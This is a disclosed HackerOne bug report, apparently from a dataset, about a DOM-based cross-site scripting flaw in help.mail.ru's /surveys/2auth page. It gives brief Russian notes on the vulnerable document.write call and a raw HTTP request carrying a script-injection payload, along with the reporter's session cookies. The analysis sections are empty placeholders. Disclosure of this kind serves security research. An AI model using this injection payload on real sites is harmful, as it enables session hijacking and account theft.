---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '41940'
original_report_id: '41940'
title: '/surveys/2auth: DOM-based XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2014-12-26T14:19:21.956Z'
disclosed_at: '2015-09-13T12:09:54.287Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# /surveys/2auth: DOM-based XSS

## Metadata

- HackerOne Report ID: 41940
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:09:54.287Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

document.write('<meta http-equiv="refresh" content="0;url='+window.location+'" />');

в него попадаем, когда кука swa_lang=en для меня

Firefox URL-encode-ит location, увы
на IE должно прокатить при кейсе BlackFan-а когда другой сайт выдает location

GET /surveys/2auth?a='"%20content="40"/>%20<script>alert(123);</script><!-- HTTP/1.1
Host: help.mail.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: mrcu=6D9254354D815F74F8E083148E4F; p=aREAAM+1lAAA; VID=25lbI608641I:; Mpop=1418228792:7c446677540e755b19050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABAAAID0QcA; i=AQDibIhUBgATAAgQBQkBAdwEAgAGAakHAZMpAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAQBfAggWB0oAAUwAAU4AAWQAAWYAAXIAAXQAAQ==; b=HUADAIDhjwQA/EhRA0nYySBGSCOgAAAAQbVtGxAkxM8N2S/iFAIA; s=fver=15|dpr=1; _ga=GA1.2.1044800337.1413873207; lang=ru; lang_set=1; swa_lang=en; _showsc_isox@inbox.ru=1; c=6HGIVAAAAJ6MNQARAAQALAABAAIA; urxvt=a84549b0ff1e2720b3d7c69263a86294
Connection: keep-alive

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
